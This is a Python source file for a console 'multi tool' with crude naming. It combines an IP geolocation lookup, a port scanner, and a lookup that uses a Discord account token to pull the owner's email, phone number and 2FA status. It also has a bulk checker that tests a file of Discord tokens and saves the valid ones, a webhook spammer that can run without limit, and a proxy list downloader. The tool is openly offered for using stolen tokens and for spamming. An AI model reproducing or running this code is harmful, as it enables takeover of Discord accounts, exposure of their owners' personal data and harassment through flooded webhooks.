import sys
import ctypes
import requests
import time
import threading
import socket
import concurrent.futures
from os import system, name
from random import randint
from colorama import Fore
cummands = ['1','2','3','4','5','6','clear','cls','logout','exit','quit']

def shitass_clear():
	if name == 'nt':
		_ = system('cls')
	else:
		_ = system('clear')

def shitass_exit():
	sys.exit("   ╠═[X] EXITING > GOODBYE.")

def shitass_main():
	global newprompt
	newprompt = True
	ctypes.windll.kernel32.SetConsoleTitleW(
		f'Shitass Multi Tool | By bong#5107')
	print('')
	print('')
	shitass_clear()
	print(f'''\n


				███████╗██╗  ██╗██╗████████╗ █████╗ ███████╗███████╗
				██╔════╝██║  ██║██║╚══██╔══╝██╔══██╗██╔════╝██╔════╝
				███████╗███████║██║   ██║   ███████║███████╗███████╗
				╚════██║██╔══██║██║   ██║   ██╔══██║╚════██║╚════██║
				███████║██║  ██║██║   ██║   ██║  ██║███████║███████║
				╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝
																													                                               
		═════════════════════════════════════════════════════════════════════════════════════
		 [{Fore.CYAN}1{Fore.RESET}] IP/DOMAIN CHECKER | [{Fore.MAGENTA}2{Fore.RESET}] PORT SCANNER | [{Fore.CYAN}3{Fore.RESET}] TOKEN INFO | [{Fore.MAGENTA}4{Fore.RESET}] MULTI TOKEN CHECKER
		 [{Fore.CYAN}5{Fore.RESET}] WEBHOOK SPAMMER   | [{Fore.MAGENTA}6{Fore.RESET}] PROXY GEN    | 
		═════════════════════════════════════════════════════════════════════════════════════''')


def pscan(ipaddress, port, threads):
	print_lock = threading.Lock()

	def scan(ipaddress, port):
		scanner = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		scanner.settimeout(1)
		try:
			scanner.connect((ipaddress, port))
			scanner.close()
			with print_lock:
				print()
				print(f'[{Fore.WHITE}{port}{Fore.RESET}]' + f'{Fore.GREEN}OPEN{Fore.RESET}')
		except:
			pass

	with concurrent.futures.ThreadPoolExecutor(max_workers=int(threads)) as executor:
		for port in range(int(port)):
			executor.submit(scan, ipaddress, port + 1)


def ip(ipaddress):
	shitass_main()
	URL = f'http://ip-api.com/json/{ipaddress}?fields=query,status,continent,country,regionName,city,district,zip,lat,lon,isp,org,as,reverse,mobile,proxy,hosting'

	req = requests.get(url = URL)
	data = req.json()
	status = data['status']
	if(status == 'fail'):
		input(f'{Fore.RED}REQUEST FAILED{Fore.RESET}')
	else:
		query = data['query']
		continent = data['continent']
		country = data['country']
		region = data['regionName']
		city = data['city']
		zipp = data['zip']
		lat = data['lat']
		lon = data['lon']
		isp = data['isp']
		org = data['org']
		asn = data['as']
		mobile = data['mobile']
		proxy = data['proxy']
		hosting = data['hosting']

		print(f'''
		[{Fore.MAGENTA}IP:{Fore.RESET}]                     {query}
		[{Fore.MAGENTA}CONTINENT:{Fore.RESET}]              {continent}		
		[{Fore.MAGENTA}COUNTRY:{Fore.RESET}]		  {country}
		[{Fore.MAGENTA}REGION:{Fore.RESET}]		  {region}
		[{Fore.MAGENTA}CITY:{Fore.RESET}]			  {city}
		[{Fore.MAGENTA}ZIP:{Fore.RESET}]			  {zipp}
		[{Fore.MAGENTA}LATITUDE:{Fore.RESET}]		  {lat}
		[{Fore.MAGENTA}LONGITUDE:{Fore.RESET}]		  {lon}
		[{Fore.MAGENTA}ISP:{Fore.RESET}]		          {isp} 
		[{Fore.MAGENTA}ORGINIZATION:{Fore.RESET}]	          {org} 	
		[{Fore.MAGENTA}AS:{Fore.RESET}]		          {asn}     
		[{Fore.MAGENTA}MOBILE?:{Fore.RESET}]		  {mobile} 
		[{Fore.MAGENTA}PROXY?:{Fore.RESET}]		  {proxy} 
		[{Fore.MAGENTA}HOSTING?:{Fore.RESET}]		  {hosting} 


		''')


def tokenInfo(token):
	shitass_main()
	headers = {'Authorization': token, 'Content-Type': 'application/json'}
	req = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
	if req.status_code == 200:
			userName = req.json()['username'] + '#' + req.json()['discriminator']
			userID = req.json()['id']
			phone = req.json()['phone']
			email = req.json()['email']
			mfa = req.json()['mfa_enabled']
			if(mfa == 'false'):
				mf = 'Disabled'
			else:
				mf = 'Enabled'
			print(f'''
			[{Fore.MAGENTA}USERNAME:{Fore.RESET}]        {userName}
			[{Fore.MAGENTA}USERID:{Fore.RESET}]          {userID}
			[{Fore.MAGENTA}2FA:{Fore.RESET}]             {mf}
			[{Fore.MAGENTA}EMAIL:{Fore.RESET}]           {email}
			[{Fore.MAGENTA}PHONE NUMBER:{Fore.RESET}]    {phone}
			[{Fore.MAGENTA}TOKEN:{Fore.RESET}]           {token}

			''')
	else:
		print(f'{Fore.RED}{token} IS INVALID{Fore.RESET}')


def tokenCheck():
	shitass_main()
	input(f"[{Fore.GREEN}!{Fore.RESET}] PROGRAM WILL {Fore.RED}BREAK{Fore.RESET} WITHOUT A {Fore.GREEN}TOKENS.TXT{Fore.RESET}")
	checked = []
	with open('tokens.txt', 'r') as f:
		for line in f:
			time.sleep(0)
			token = line.rstrip("\n")
			headers = {
				'Authorization': f'{token}'  
			}
			src = requests.get('https://discordapp.com/api/v6/auth/login', headers=headers)
			try:
				if src.status_code == 200:
					print(f"[{Fore.GREEN}VALID TOKEN{Fore.RESET}] > " + token)
					checked.append(token)
				else:
					print(f"[{Fore.RED}INVALID TOKEN{Fore.RESET}] > " + token)
			except Exception:
				print (f"TOKEN-CHECKER [{Fore.RED}FAILED{Fore.RESET}] | CHECK INTERNET CONNECTIVITY, OR TRY AGAIN LATER")
	if len(checked) > 0:
		save = input(f'{Fore.GREEN}{len(checked)} VALID TOKENS{Fore.RESET}\nSAVE TOKENS TO FILE? (Y/N)')
		if save == 'y':
			balls = randint(1,999)
			name = f'VALID_TOKENS{balls}'
			with open(f'{name}.txt', 'w') as saveFile:
				saveFile.write('\n'.join(checked))
			print(f'SAVED TOKENS TO {name}')


def webhookfuck(link, name, message, amount):
	shitass_main()
	sex = True
	shitter = 0

	while sex == True if amount == "inf" else shitter < int(amount):
		try:
			req = requests.post(
				link,
				json={
					"content": str(message),
					"name": str(name),
					"avatar_url": "https://i.kym-cdn.com/entries/icons/original/000/018/166/pakalu.png" # change this shit if u want
				}
			)
			if req.status_code == 204:
				print(f'{Fore.GREEN}[SENT MESSAGE]{Fore.RESET}')
			else:
				print(f'{Fore.RED}[FAILED TO SEND MESSAGE]{Fore.RESET}')
		except:
			sex = False
			print(f'{Fore.RED}STOPPED{Fore.RESET}')
		shitter += 1


def proxygen(protocol):
	shitass_main()

	if protocol == 1:
		protocol = 'http'
	elif protocol == 2:
		protocol = 'socks4'
	elif protocol == 3:
		protocol = 'socks5'
	else:
		protocol = 'all'
		
	url = f'https://api.proxyscrape.com/v2/?request=getproxies&protocol={protocol}&timeout=10000&country=all&ssl=all&anonymity=all'

	req = requests.get(url)
	data = req.text
	if req.status_code == 200:
		balls = randint(1,999)
		name = f'{protocol.upper()}_PROXIES{balls}'
		with open(f'{name}.txt', 'w') as saveFile:
			saveFile.write(data)

		with open(f'{name}.txt') as poop:
			lines = poop.readlines()
		
		with open(f'{name}.txt', 'r+') as poop:
			lines = filter(lambda x: x.strip(), lines)
			poop.writelines(lines)
					
		print(f'{Fore.GREEN}SAVED PROXIES TO {name}{Fore.RESET}')
	else:
		print(f'{Fore.RED}REQUEST FAILED{Fore.RESET}')



def cmds():
	global newprompt
	if newprompt:
		newprompt = False
		command = input(
			f"   ╔════════════[{Fore.MAGENTA}<>{Fore.RESET}]\n   ╚═══>{Fore.CYAN}Shitass{Fore.RESET}@bignuts {Fore.MAGENTA}-{Fore.RESET} ")
	else:
		command = input(
			f"   ╠════════════[{Fore.MAGENTA}<>{Fore.RESET}]\n   ╚═══>{Fore.CYAN}Shitass{Fore.RESET}@bignuts {Fore.MAGENTA}-{Fore.RESET} ")
	if command not in cummands:
		print(
			f"   ╠═[{Fore.MAGENTA}X{Fore.RESET}] {Fore.RED}Invalid{Fore.RESET} Option")
		cmds()
	if command == "1":
		print(f'[{Fore.MAGENTA}>{Fore.RESET}] ENTER IP/DOMAIN', end=''); ipaddress = input('  :  ')
		ip(ipaddress)
	elif command == "2":
		print(f'[{Fore.MAGENTA}>{Fore.RESET}] ENTER IP/DOMAIN', end=''); ipaddress = input('  :  ')
		print(f'[{Fore.MAGENTA}>{Fore.RESET}] ENTER PORT RANGE EX: 1000', end=''); port = input('  :  ')
		print(f'[{Fore.MAGENTA}>{Fore.RESET}] ENTER THREAD COUNT', end=''); threads = input('  :  ')
		pscan(ipaddress, port, threads)
	elif command == "3":
		print(f'[{Fore.MAGENTA}>{Fore.RESET}] ENTER ACCOUNT TOKEN', end=''); token = input('  :  ')
		tokenInfo(token)
	elif command == "4":
		tokenCheck()
	elif command == "5":
		print(f'[{Fore.MAGENTA}>{Fore.RESET}] ENTER WEBHOOK LINK', end=''); link = input('  :  ')
		print(f'[{Fore.MAGENTA}>{Fore.RESET}] ENTER CUSTOM WEBHOOK NAME', end=''); name = input('  :  ')
		print(f'[{Fore.MAGENTA}>{Fore.RESET}] ENTER MESSAGE', end=''); message = input('  :  ')
		print(f'[{Fore.MAGENTA}>{Fore.RESET}] ENTER NUMBER OF MESSAGES PUT "inf" FOR INFINITE', end=''); amount = input('  :  ')
		webhookfuck(link, name, message, amount)
	elif command == "6":
		print(f'[{Fore.MAGENTA}>{Fore.RESET}] ENTER PROXY PROTOCOL\n[{Fore.MAGENTA}>{Fore.RESET}] 1 FOR HTTPS\n[{Fore.MAGENTA}>{Fore.RESET}] 2 FOR SOCKS4\n[{Fore.MAGENTA}>{Fore.RESET}] 3 FOR SOCKS5\n[{Fore.MAGENTA}>{Fore.RESET}] 4 FOR ALL', end=''); protocol = input('  :  ')
		proxygen(protocol)
	elif command == "clear":
		shitass_main()
	elif command == "cls":
		shitass_main()
	elif command == "exit":
		shitass_exit()
	elif command == "quit":
		shitass_exit()
	elif command == "logout":
		shitass_exit()


shitass_main()
while True:
	try:
		cmds()
	except KeyboardInterrupt:
		pass
		print('')
		
